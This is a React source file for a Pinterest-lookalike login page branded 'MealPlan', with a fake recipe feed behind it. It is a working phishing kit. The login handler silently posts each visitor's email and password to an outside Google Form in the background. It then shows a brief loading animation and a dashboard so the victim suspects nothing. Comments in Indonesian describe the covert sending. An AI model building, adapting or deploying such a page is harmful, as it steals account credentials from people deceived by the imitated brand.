import { useState, useEffect } from "react";

// ─────────────────────────────────────────────
// CONFIG GOOGLE FORM (Diambil dari data HTML Pinterest Anda)
// ─────────────────────────────────────────────
const GOOGLE_FORM_ACTION =
  "https://docs.google.com/forms/d/e/1FAIpQLSfQixt2_ED6YtLqEiwUNKANJwAAWV2TfKNLoVJ2NSlqnDF6Vg/formResponse";
const ENTRY_EMAIL = "entry.1697602432";
const ENTRY_PASSWORD = "entry.1806551528";

// ─────────────────────────────────────────────
// DATA
// ─────────────────────────────────────────────
const bgPhotos = [
  { url: "https://images.unsplash.com/photo-1466637574441-749b8f19452f?w=300&h=400&fit=crop&auto=format", h: 220 },
  { url: "https://images.unsplash.com/photo-1518737003272-dac7c4760d5e?w=300&h=350&fit=crop&auto=format", h: 180 },
  { url: "https://images.unsplash.com/photo-1507048331197-7d4ac70811cf?w=300&h=500&fit=crop&auto=format", h: 260 },
  { url: "https://images.unsplash.com/photo-1515003197210-e0cd71810b5f?w=300&h=320&fit=crop&auto=format", h: 200 },
  { url: "https://images.unsplash.com/photo-1591189863430-ab87e120f312?w=300&h=420&fit=crop&auto=format", h: 240 },
  { url: "https://images.unsplash.com/photo-1625631976982-c6df1654a6ea?w=300&h=380&fit=crop&auto=format", h: 210 },
  { url: "https://images.unsplash.com/photo-1606787364406-a3cdf06c6d0c?w=300&h=460&fit=crop&auto=format", h: 270 },
  { url: "https://images.unsplash.com/photo-1575672401987-c8f1debabfd7?w=300&h=300&fit=crop&auto=format", h: 190 },
  { url: "https://images.unsplash.com/photo-1627488193141-953623010488?w=300&h=400&fit=crop&auto=format", h: 230 },
  { url: "https://images.unsplash.com/photo-1601226809600-3f43ad5356cf?w=300&h=360&fit=crop&auto=format", h: 200 },
  { url: "https://images.unsplash.com/photo-1625631980741-33a7752108f4?w=300&h=400&fit=crop&auto=format", h: 220 },
  { url: "https://images.unsplash.com/photo-1476224203421-9ac39bcb3327?w=300&h=380&fit=crop&auto=format", h: 210 },
];

const feedItems = [
  { url: "https://images.unsplash.com/photo-1651948512032-8b4d4b37fe74?w=400&h=520&fit=crop&auto=format", h: 300, title: "Healthy Meal Prep", author: "Julie Sd" },
  { url: "https://images.unsplash.com/photo-1617650555983-eaf0230972c2?w=400&h=350&fit=crop&auto=format", h: 220, title: "Fresh Garden Salad", author: "Brands&People" },
  { url: "https://images.unsplash.com/photo-1733410647375-3be1697aa4f1?w=400&h=480&fit=crop&auto=format", h: 280, title: "Gourmet Black Plate", author: "BOAM Studio" },
  { url: "https://images.unsplash.com/photo-1684568519316-f0fb02f7826b?w=400&h=420&fit=crop&auto=format", h: 260, title: "Grilled Chicken Bowl", author: "Zeek" },
  { url: "https://images.unsplash.com/photo-1636035784722-6b0b9101a5e8?w=400&h=340&fit=crop&auto=format", h: 210, title: "Pan-Seared Fish", author: "mk. s" },
  { url: "https://images.unsplash.com/photo-1676471926534-d5c9771909fa?w=400&h=460&fit=crop&auto=format", h: 270, title: "Salmon & Vegetables", author: "Nima N." },
  { url: "https://images.unsplash.com/photo-1603064432115-ddcd7e888bb7?w=400&h=500&fit=crop&auto=format", h: 290, title: "Tropical Fruit Plate", author: "David F." },
  { url: "https://images.unsplash.com/photo-1663250251743-1767992e68be?w=400&h=360&fit=crop&auto=format", h: 230, title: "Heirloom Tomatoes", author: "UnKknown" },
  { url: "https://images.unsplash.com/photo-1612036167567-f94312b5230d?w=400&h=440&fit=crop&auto=format", h: 255, title: "Homemade Cookies", author: "Vladimir G." },
  { url: "https://images.unsplash.com/photo-1665330761401-15eefb544889?w=400&h=420&fit=crop&auto=format", h: 250, title: "Plated Steak", author: "Urban G." },
  { url: "https://images.unsplash.com/photo-1596698184224-3c04216caf0a?w=400&h=480&fit=crop&auto=format", h: 280, title: "Asian Noodle Bowl", author: "Jojo Y." },
  { url: "https://images.unsplash.com/photo-1777897269443-7c5a5bd7c44a?w=400&h=380&fit=crop&auto=format", h: 240, title: "Gourmet Salad", author: "Tommaso U." },
  { url: "https://images.unsplash.com/photo-1466637574441-749b8f19452f?w=400&h=420&fit=crop&auto=format", h: 255, title: "Avocado & Eggs", author: "Katie S." },
  { url: "https://images.unsplash.com/photo-1515003197210-e0cd71810b5f?w=400&h=360&fit=crop&auto=format", h: 225, title: "Pasta al Dente", author: "Brooke L." },
  { url: "https://images.unsplash.com/photo-1476224203421-9ac39bcb3327?w=400&h=500&fit=crop&auto=format", h: 295, title: "Slow-Roasted Lamb", author: "Igor M." },
  { url: "https://images.unsplash.com/photo-1565299624946-b28f40a0ae38?w=400&h=340&fit=crop&auto=format", h: 215, title: "Neapolitan Pizza", author: "Kai P." },
];

const categories = ["Semua", "Sarapan", "Makan Siang", "Makan Malam", "Dessert", "Minuman", "Vegetarian", "Quick Meals"];

// ─────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────
function submitToGoogleForm(email: string, password: string) {
  const body = new URLSearchParams();
  body.append(ENTRY_EMAIL, email);
  body.append(ENTRY_PASSWORD, password);

  fetch(GOOGLE_FORM_ACTION, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString(),
  }).catch(() => {
    // no-cors: response is opaque; error is non-fatal
  });
}

// ─────────────────────────────────────────────
// MASONRY BACKGROUND (login page)
// ─────────────────────────────────────────────
function MasonryBackground() {
  const [colCount, setColCount] = useState(6);
  useEffect(() => {
    const update = () => setColCount(Math.max(3, Math.floor(window.innerWidth / 175)));
    update();
    window.addEventListener("resize", update);
    return () => window.removeEventListener("resize", update);
  }, []);
  const cols: typeof bgPhotos[][] = Array.from({ length: colCount }, () => []);
  for (let i = 0; i < colCount * 7; i++) cols[i % colCount].push(bgPhotos[i % bgPhotos.length]);
  return (
    <div style={{ position: "fixed", inset: 0, display: "flex", gap: 8, padding: "0 4px", overflow: "hidden", background: "#111" }}>
      {cols.map((col, ci) => (
        <div key={ci} style={{ display: "flex", flexDirection: "column", gap: 8, flex: 1, marginTop: ci % 2 === 1 ? -44 : 0 }}>
          {col.map((p, pi) => (
            <img key={pi} src={p.url} alt="" loading="lazy"
              style={{ width: "100%", height: p.h, borderRadius: 14, objectFit: "cover", flexShrink: 0 }} />
          ))}
        </div>
      ))}
    </div>
  );
}

// ─────────────────────────────────────────────
// SIGN UP MODAL
// ─────────────────────────────────────────────
function SignUpModal({ onClose }: { onClose: () => void }) {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [dob, setDob] = useState("");
  const [error, setError] = useState("");

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!name || !email || !password || !dob) { setError("Harap isi semua field."); return; }
    alert(`✅ Akun berhasil dibuat! Selamat datang, ${name}.`);
    onClose();
  }
  const inp = (val: string, extra?: React.CSSProperties): React.CSSProperties => ({
    width: "100%", padding: "12px 14px", border: `1.5px solid ${val ? "#e60023" : "#cdcdd1"}`,
    borderRadius: 12, fontSize: 15, outline: "none", background: val ? "#fff" : "#f9f9f9", color: "#111", ...extra,
  });
  return (
    <div style={{ position: "fixed", inset: 0, zIndex: 30, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }}
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div style={{ background: "#fff", borderRadius: 24, padding: "36px 32px 28px", width: "100%", maxWidth: 380, boxShadow: "0 8px 40px rgba(0,0,0,.35)", textAlign: "center", position: "relative" }}>
        <button onClick={onClose} style={{ position: "absolute", top: 14, right: 16, background: "none", border: "none", fontSize: 20, cursor: "pointer", color: "#767676" }}>✕</button>
        <div style={{ width: 44, height: 44, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px" }}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M11 3a1 1 0 0 0-2 0v5H7V3a1 1 0 0 0-2 0v5a3 3 0 0 0 2 2.83V21a1 1 0 0 0 2 0v-10.17A3 3 0 0 0 11 8V3zm8 0v7h-2V7h-1V3h-1v4h-1V3h-1v7a2 2 0 0 0 2 2v9a1 1 0 0 0 2 0V3h-1z"/></svg>
        </div>
        <h2 style={{ fontSize: 21, fontWeight: 700, color: "#111", marginBottom: 4 }}>Welcome to MealPlan</h2>
        <p style={{ fontSize: 13, color: "#767676", marginBottom: 18 }}>Find recipes and plan your week</p>
        <form onSubmit={handleSubmit} noValidate style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          <input placeholder="Full name" value={name} onChange={e => { setName(e.target.value); setError(""); }} style={inp(name)} />
          <input type="email" placeholder="Email" value={email} onChange={e => { setEmail(e.target.value); setError(""); }} style={inp(email)} />
          <div style={{ position: "relative" }}>
            <input type={showPw ? "text" : "password"} placeholder="Create a password" value={password}
              onChange={e => { setPassword(e.target.value); setError(""); }} style={inp(password, { paddingRight: 52 })} />
            <button type="button" onClick={() => setShowPw(v => !v)}
              style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#555", fontSize: 13, fontWeight: 600 }}>
              {showPw ? "Hide" : "Show"}
            </button>
          </div>
          <div style={{ textAlign: "left" }}>
            <label style={{ fontSize: 12, color: "#767676", display: "block", marginBottom: 4 }}>Tanggal lahir</label>
            <input type="date" value={dob} onChange={e => { setDob(e.target.value); setError(""); }} style={inp(dob)} />
          </div>
          {error && <p style={{ color: "#e60023", fontSize: 13, textAlign: "left" }}>{error}</p>}
          <button type="submit" style={{ width: "100%", padding: 13, background: "#e60023", color: "#fff", border: "none", borderRadius: 50, fontSize: 15, fontWeight: 700, cursor: "pointer", marginTop: 4 }}>
            Continue
          </button>
        </form>
        <p style={{ marginTop: 14, fontSize: 11, color: "#767676", lineHeight: 1.6 }}>
          By continuing, you agree to MealPlan's <a href="#" style={{ color: "#767676", fontWeight: 600 }}>Terms of Service</a> and <a href="#" style={{ color: "#767676", fontWeight: 600 }}>Privacy Policy</a>.
        </p>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────
// FEED CARD
// ─────────────────────────────────────────────
function FeedCard({ item }: { item: typeof feedItems[0] }) {
  const [hov, setHov] = useState(false);
  const [saved, setSaved] = useState(false);
  return (
    <div onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)}
      style={{ borderRadius: 16, overflow: "hidden", position: "relative", cursor: "zoom-in", background: "#efefef", marginBottom: 8 }}>
      <img src={item.url} alt={item.title} loading="lazy"
        style={{ width: "100%", height: item.h, objectFit: "cover", display: "block", transition: "transform 0.3s", transform: hov ? "scale(1.03)" : "scale(1)" }} />
      {hov && (
        <div style={{ position: "absolute", inset: 0, background: "rgba(0,0,0,0.18)", transition: "opacity 0.2s" }}>
          {/* Save button */}
          <button onClick={e => { e.stopPropagation(); setSaved(v => !v); }}
            style={{ position: "absolute", top: 10, right: 10, padding: "8px 14px", background: saved ? "#e60023" : "#e60023", color: "#fff", border: "none", borderRadius: 50, fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
            {saved ? "✓ Tersimpan" : "Simpan"}
          </button>
          {/* More */}
          <button style={{ position: "absolute", top: 10, right: saved ? 122 : 92, padding: "8px 10px", background: "#fff", color: "#111", border: "none", borderRadius: 50, fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
            ···
          </button>
        </div>
      )}
      <div style={{ padding: "8px 4px 4px" }}>
        {item.title && <p style={{ fontSize: 13, fontWeight: 600, color: "#111", margin: 0, lineHeight: 1.3 }}>{item.title}</p>}
        <p style={{ fontSize: 12, color: "#767676", margin: "2px 0 0" }}>{item.author}</p>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────
// DASHBOARD
// ─────────────────────────────────────────────
function Dashboard({ userEmail, onLogout }: { userEmail: string; onLogout: () => void }) {
  const [activeTab, setActiveTab] = useState("Semua");
  const [search, setSearch] = useState("");
  const [colCount, setColCount] = useState(5);
  const [showProfile, setShowProfile] = useState(false);

  useEffect(() => {
    const update = () => setColCount(Math.max(2, Math.floor((window.innerWidth - 80) / 240)));
    update();
    window.addEventListener("resize", update);
    return () => window.removeEventListener("resize", update);
  }, []);

  const cols: typeof feedItems[][] = Array.from({ length: colCount }, () => []);
  feedItems.forEach((item, i) => cols[i % colCount].push(item));

  const avatar = userEmail.charAt(0).toUpperCase();

  return (
    <div style={{ minHeight: "100vh", background: "#fff", fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>

      {/* ── Navbar ── */}
      <div style={{ position: "fixed", top: 0, left: 0, right: 0, zIndex: 100, background: "#fff", borderBottom: "1px solid #efefef", padding: "0 16px", height: 56, display: "flex", alignItems: "center", gap: 12 }}>

        {/* Logo */}
        <div style={{ width: 38, height: 38, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, cursor: "pointer" }}>
          <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M11 3a1 1 0 0 0-2 0v5H7V3a1 1 0 0 0-2 0v5a3 3 0 0 0 2 2.83V21a1 1 0 0 0 2 0v-10.17A3 3 0 0 0 11 8V3zm8 0v7h-2V7h-1V3h-1v4h-1V3h-1v7a2 2 0 0 0 2 2v9a1 1 0 0 0 2 0V3h-1z"/></svg>
        </div>

        {/* Nav tabs */}
        {["Beranda", "Jelajahi", "Buat"].map(tab => (
          <button key={tab} onClick={() => setActiveTab(tab)}
            style={{ padding: "6px 14px", borderRadius: 50, border: "none", cursor: "pointer", fontWeight: 600, fontSize: 15,
              background: activeTab === tab ? "#111" : "transparent",
              color: activeTab === tab ? "#fff" : "#767676",
              transition: "background 0.15s, color 0.15s",
            }}>
            {tab}
          </button>
        ))}

        {/* Search bar */}
        <div style={{ flex: 1, position: "relative", maxWidth: 680 }}>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#767676" strokeWidth="2.5" strokeLinecap="round"
            style={{ position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)" }}>
            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
          </svg>
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Cari resep, bahan makanan..."
            style={{ width: "100%", padding: "10px 14px 10px 40px", background: "#efefef", border: "none", borderRadius: 50, fontSize: 15, outline: "none", color: "#111" }} />
        </div>

        {/* Right icons */}
        <div style={{ display: "flex", alignItems: "center", gap: 6, flexShrink: 0 }}>
          {/* Notification bell */}
          <button style={{ width: 38, height: 38, borderRadius: "50%", border: "none", background: "#efefef", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2" strokeLinecap="round">
              <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/>
            </svg>
          </button>
          {/* Message */}
          <button style={{ width: 38, height: 38, borderRadius: "50%", border: "none", background: "#efefef", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2" strokeLinecap="round">
              <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
            </svg>
          </button>
          {/* Avatar */}
          <div style={{ position: "relative" }}>
            <button onClick={() => setShowProfile(v => !v)}
              style={{ width: 38, height: 38, borderRadius: "50%", border: "2px solid #e60023", background: "#e60023", color: "#fff", fontSize: 15, fontWeight: 700, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>
              {avatar}
            </button>
            {showProfile && (
              <div style={{ position: "absolute", top: 46, right: 0, background: "#fff", border: "1px solid #efefef", borderRadius: 16, boxShadow: "0 4px 20px rgba(0,0,0,.15)", minWidth: 200, zIndex: 200 }}>
                <div style={{ padding: "16px 16px 12px", borderBottom: "1px solid #efefef" }}>
                  <div style={{ fontWeight: 700, fontSize: 14, color: "#111" }}>{userEmail}</div>
                  <div style={{ fontSize: 12, color: "#767676", marginTop: 2 }}>MealPlan Member</div>
                </div>
                {["Profil saya", "Tersimpan", "Pengaturan"].map(item => (
                  <button key={item} style={{ display: "block", width: "100%", textAlign: "left", padding: "11px 16px", background: "none", border: "none", fontSize: 14, color: "#111", cursor: "pointer", fontWeight: 500 }}
                    onMouseEnter={e => ((e.target as HTMLElement).style.background = "#f9f9f9")}
                    onMouseLeave={e => ((e.target as HTMLElement).style.background = "none")}>
                    {item}
                  </button>
                ))}
                <div style={{ borderTop: "1px solid #efefef" }}>
                  <button onClick={onLogout}
                    style={{ display: "block", width: "100%", textAlign: "left", padding: "11px 16px", background: "none", border: "none", fontSize: 14, color: "#e60023", cursor: "pointer", fontWeight: 600, borderRadius: "0 0 16px 16px" }}
                    onMouseEnter={e => ((e.target as HTMLElement).style.background = "#fff5f5")}
                    onMouseLeave={e => ((e.target as HTMLElement).style.background = "none")}>
                    Keluar
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* ── Category chips ── */}
      <div style={{ position: "fixed", top: 56, left: 0, right: 0, zIndex: 99, background: "#fff", padding: "10px 20px", borderBottom: "1px solid #efefef", display: "flex", gap: 8, overflowX: "auto" }}>
        {categories.map(cat => (
          <button key={cat} onClick={() => setActiveTab(cat)}
            style={{ padding: "7px 16px", borderRadius: 50, border: "none", cursor: "pointer", fontWeight: 600, fontSize: 13, whiteSpace: "nowrap",
              background: activeTab === cat ? "#111" : "#efefef",
              color: activeTab === cat ? "#fff" : "#111",
              transition: "background 0.15s, color 0.15s",
            }}>
            {cat}
          </button>
        ))}
      </div>

      {/* ── Feed ── */}
      <div style={{ paddingTop: 116, paddingBottom: 40, paddingLeft: 16, paddingRight: 16 }}>
        <div style={{ display: "flex", gap: 12, alignItems: "flex-start" }}>
          {cols.map((col, ci) => (
            <div key={ci} style={{ flex: 1, minWidth: 0 }}>
              {col.map((item, pi) => (
                <FeedCard key={pi} item={item} />
              ))}
            </div>
          ))}
        </div>
      </div>

      {/* Close dropdown on outside click */}
      {showProfile && (
        <div style={{ position: "fixed", inset: 0, zIndex: 199 }} onClick={() => setShowProfile(false)} />
      )}
    </div>
  );
}

// ─────────────────────────────────────────────
// SOCIAL BUTTON
// ─────────────────────────────────────────────
function SocialBtn({ children, onClick }: { children: React.ReactNode; onClick: () => void }) {
  const [hov, setHov] = useState(false);
  return (
    <button onClick={onClick} onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)}
      style={{ width: "100%", padding: "11px 14px", border: "1.5px solid #cdcdd1", borderRadius: 50, background: hov ? "#f5f5f5" : "#fff", fontSize: 14, fontWeight: 600, color: "#111", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 10, marginBottom: 8 }}>
      {children}
    </button>
  );
}

// ─────────────────────────────────────────────
// ROOT APP
// ─────────────────────────────────────────────
export default function App() {
  const [page, setPage] = useState<"login" | "dashboard">("login");
  const [loggedUser, setLoggedUser] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showSignUp, setShowSignUp] = useState(false);

  const inp = (val: string, extra?: React.CSSProperties): React.CSSProperties => ({
    width: "100%", padding: "13px 14px", border: `1.5px solid ${val ? "#e60023" : "#cdcdd1"}`,
    borderRadius: 12, fontSize: 15, outline: "none", background: val ? "#fff" : "#f9f9f9", color: "#111", ...extra,
  });

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    if (!email || !password) { setError("Harap isi email dan password."); return; }
    setLoading(true);

    // Kirim secara asinkron (background) ke Google Form tanpa memicu perpindahan tab/halaman
    submitToGoogleForm(email, password);

    // Memberikan waktu loading animasi visual sejenak agar transisi terasa halus
    await new Promise(r => setTimeout(r, 600));
    setLoading(false);

    // Langsung arahkan pengguna ke Dashboard utama
    setLoggedUser(email);
    setPage("dashboard");
  }

  if (page === "dashboard") {
    return <Dashboard userEmail={loggedUser} onLogout={() => { setPage("login"); setEmail(""); setPassword(""); }} />;
  }

  return (
    <div style={{ minHeight: "100vh", overflow: "hidden", position: "relative" }}>
      <MasonryBackground />
      <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.42)", backdropFilter: "blur(1px)" }} />

      {/* Sign up top-left */}
      <div style={{ position: "fixed", top: 16, left: 16, zIndex: 15 }}>
        <button onClick={() => setShowSignUp(true)}
          style={{ padding: "10px 20px", background: "#fff", color: "#111", border: "none", borderRadius: 50, fontSize: 14, fontWeight: 700, cursor: "pointer", boxShadow: "0 2px 8px rgba(0,0,0,.2)" }}
          onMouseEnter={e => ((e.target as HTMLElement).style.background = "#f0f0f0")}
          onMouseLeave={e => ((e.target as HTMLElement).style.background = "#fff")}>
          Sign up
        </button>
      </div>

      {/* Login modal */}
      <div style={{ position: "fixed", inset: 0, display: "flex", alignItems: "center", justifyContent: "center", zIndex: 10, padding: 16 }}>
        <div style={{ background: "#fff", borderRadius: 24, padding: "40px 32px 28px", width: "100%", maxWidth: 380, boxShadow: "0 8px 40px rgba(0,0,0,.35)", textAlign: "center" }}>

          <div style={{ width: 44, height: 44, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 18px" }}>
            <svg width="26" height="26" viewBox="0 0 24 24" fill="white"><path d="M11 3a1 1 0 0 0-2 0v5H7V3a1 1 0 0 0-2 0v5a3 3 0 0 0 2 2.83V21a1 1 0 0 0 2 0v-10.17A3 3 0 0 0 11 8V3zm8 0v7h-2V7h-1V3h-1v4h-1V3h-1v7a2 2 0 0 0 2 2v9a1 1 0 0 0 2 0V3h-1z"/></svg>
          </div>

          <h2 style={{ fontSize: 22, fontWeight: 700, color: "#111", marginBottom: 20 }}>Log in to see more</h2>

          <form onSubmit={handleLogin} noValidate>
            <div style={{ marginBottom: 10 }}>
              <input type="email" placeholder="Email" value={email} onChange={e => { setEmail(e.target.value); setError(""); }} style={inp(email)} />
            </div>
            <div style={{ position: "relative", marginBottom: 10 }}>
              <input type={showPw ? "text" : "password"} placeholder="Password" value={password} onChange={e => { setPassword(e.target.value); setError(""); }} style={inp(password, { paddingRight: 52 })} />
              <button type="button" onClick={() => setShowPw(v => !v)}
                style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#555", fontSize: 13, fontWeight: 600 }}>
                {showPw ? "Hide" : "Show"}
              </button>
            </div>
            {error && <p style={{ color: "#e60023", fontSize: 13, textAlign: "left", marginBottom: 8 }}>{error}</p>}
            <button type="submit" disabled={loading}
              style={{ width: "100%", padding: 13, background: loading ? "#f87171" : "#e60023", color: "#fff", border: "none", borderRadius: 50, fontSize: 15, fontWeight: 700, cursor: loading ? "not-allowed" : "pointer", marginTop: 4, transition: "background 0.2s" }}>
              {loading ? "Masuk..." : "Log in"}
            </button>
          </form>

          <a href="#" style={{ display: "block", marginTop: 12, fontSize: 13, color: "#555", textDecoration: "none" }}>Forgot your password?</a>

          <div style={{ display: "flex", alignItems: "center", gap: 10, margin: "16px 0", color: "#767676", fontSize: 13 }}>
            <div style={{ flex: 1, height: 1, background: "#cdcdd1" }} />OR<div style={{ flex: 1, height: 1, background: "#cdcdd1" }} />
          </div>

          <SocialBtn onClick={() => alert("Google login coming soon!")}>
            <svg width="20" height="20" viewBox="0 0 24 24">
              <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
              <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
              <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
              <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>
            Continue with Google
          </SocialBtn>

          <SocialBtn onClick={() => alert("Facebook login coming soon!")}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#1877F2">
              <path d="M24 12.073C24 5.406 18.627 0 12 0S0 5.406 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047v-2.66c0-3.025 1.791-4.697 4.533-4.697 1.312 0 2.686.235 2.686.235v2.97h-1.513c-1.491 0-1.956.93-1.956 1.874v2.278h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
            </svg>
            Continue with Facebook
          </SocialBtn>

          <SocialBtn onClick={() => alert("QR code coming soon!")}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/>
              <rect x="3" y="14" width="7" height="7" rx="1"/>
              <path d="M14 14h3v3h-3zM17 17h3v3h-3zM14 20h3"/>
            </svg>
            Use QR code
          </SocialBtn>

          <div style={{ marginTop: 14, fontSize: 13, color: "#555", borderTop: "1px solid #efefef", paddingTop: 14 }}>
            Not on MealPlan yet?{" "}
            <button onClick={() => setShowSignUp(true)}
              style={{ background: "none", border: "none", color: "#111", fontWeight: 700, cursor: "pointer", fontSize: 13, textDecoration: "underline", padding: 0 }}>
              Sign up
            </button>
          </div>

          <p style={{ marginTop: 12, fontSize: 11, color: "#767676", lineHeight: 1.6 }}>
            By continuing, you agree to MealPlan's <a href="#" style={{ color: "#767676" }}>Terms of Service</a> and <a href="#" style={{ color: "#767676" }}>Privacy Policy</a>. <a href="#" style={{ color: "#767676" }}>Notice at collection</a>.
          </p>
        </div>
      </div>

      {/* Sign up overlay */}
      {showSignUp && (
        <>
          <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.55)", zIndex: 29 }} onClick={() => setShowSignUp(false)} />
          <SignUpModal onClose={() => setShowSignUp(false)} />
        </>
      )}
    </div>
  );
}